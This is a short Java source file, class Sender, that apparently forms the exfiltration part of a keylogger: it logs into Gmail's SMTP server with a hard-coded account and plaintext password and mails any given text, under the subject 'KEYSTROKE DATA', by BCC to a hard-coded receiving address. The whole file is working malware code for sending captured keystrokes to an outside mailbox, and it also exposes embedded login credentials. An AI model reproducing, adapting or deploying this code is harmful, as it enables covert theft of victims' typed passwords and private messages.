package handler;

import javax.mail.Message;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;
import java.util.Properties;

public class Sender {

    private Sender() {}

    private static final String senderEmail = "ireallylovehoodies@gmail.com";
    private static final String senderPassword = "hackthegibson";

    private static final String receiverEmail = "adadonderr@gmail.com";

    private static Properties mailServerProperties;
    private static Session mailSess;
    private static MimeMessage mailMessage;

    public static void sendEmail(String emailBody) throws Throwable {
        mailServerProperties= System.getProperties();
        mailServerProperties.put("mail.smtp.port", "587");
        mailServerProperties.put("mail.smtp.auth", "true");
        mailServerProperties.put("mail.smtp.starttls.enable", "true");

        mailSess = Session.getDefaultInstance(mailServerProperties);
        mailSess.getProperties().put("mail.smtp.ssl.trust", "smtp.gmail.com");

        mailMessage = new MimeMessage(mailSess);
        mailMessage.addRecipient(Message.RecipientType.BCC, new InternetAddress(receiverEmail));
        mailMessage.setFrom(new InternetAddress(senderEmail));
        mailMessage.setSubject("KEYSTROKE DATA");
        mailMessage.setContent(emailBody, "text/html");

        Transport transport = mailSess.getTransport("smtp");
        transport.connect("smtp.gmail.com", senderEmail, senderPassword);
        transport.sendMessage(mailMessage, mailMessage.getAllRecipients());
        transport.close();

    }

}
